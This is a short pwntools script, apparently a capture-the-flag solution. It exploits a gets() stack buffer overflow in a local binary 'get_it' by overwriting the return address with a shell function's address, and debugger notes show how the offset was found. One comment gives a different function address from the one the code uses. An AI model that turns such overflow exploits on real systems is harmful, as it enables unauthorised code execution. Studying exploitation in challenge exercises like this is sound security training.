from pwn import *
'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

@main funtion
{
  char local_28 [32];
  
  puts("Do you gets it??");
  gets(local_28);
  return 0;
}
'''

#load process
p = process('./get_it')
#  64 bits
# address 0x0040060d ---> give_shell
address = p64(0x004005b6)

"""
gdb-peda$ find whereismy
Searching for 'whereismy' in: None ranges
Found 2 results, display max 2 items:
 [heap] : 0x6026b0 ("whereismy\n")
[stack] : 0x7fffffffdea0 ("whereismy")

0x7fffffffdea0

gdb-peda$ i f
Stack level 0, frame at 0x7fffffffded0:
 rip = 0x4005f6 in main; saved rip = 0x7ffff7e0ae0b
 called by frame at 0x7fffffffdf90
 Arglist at 0x7fffffffdec0, args: 
 Locals at 0x7fffffffdec0, Previous frame's sp is 0x7fffffffded0
 Saved registers:
  rbp at 0x7fffffffdec0, rip at 0x7fffffffdec8

0x7fffffffdec8

"""
# 0x7fffffffdec8 - 0x7fffffffdea0 = 0x28
offset  = "\x00" * 0x28
payload = offset + address
p.sendline(payload)
p.interactive()




